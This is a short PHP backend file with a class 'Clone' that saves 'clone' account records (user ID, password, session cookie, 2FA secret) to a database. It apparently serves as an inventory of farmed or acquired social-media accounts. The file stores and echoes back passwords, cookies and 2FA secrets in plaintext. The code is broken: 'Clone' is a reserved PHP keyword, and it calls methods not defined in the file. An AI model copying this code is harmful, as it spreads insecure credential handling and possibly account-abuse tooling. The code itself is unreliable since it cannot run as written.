<?php
session_start();
require_once '../../Model/database.php';
/**
 * Code by @KuBon
 */
class Clone
{
	
	function __construct()
	{
		# code...
	}
	public function addCloneToDB($uid = null, $pass = "", $cookie = "", $fa = ""){
		$db = new Connect();
		$t=time();
		if($uid != 0 && $pass !="" && $cookie != ""){
			if($this->checkUid($uid)) 
			$this->response(500,array(0 =>array("satus"=>false,"msg"=>"Clone is exits")));
			$data = $db->prepare("INSERT INTO clone (uid, pass, cookie, fa,time) VALUES (:uid, :pass, :cookie, :fa,:time)");
			$data->bindParam(":uid", $uid);
			$data->bindParam(":pass", $pass);
			$data->bindParam(":cookie",$cookie);
			$data->bindParam(":fa", $fa);
			$data->bindParam(":time", $t);
			try{
				$data->execute();
				$this->response(200,array(0 =>array("uid"=>$uid,"pass"=>$pass,"cookie"=>$cookie,"2fa"=>$fa,"satus"=>true,"time"=>$t)));
			}catch(PDOException $e){
				$this->response(500,$e);
			}
			
		}else $this->response(500,"The data must right format");
		$db->close();
	}
}
?>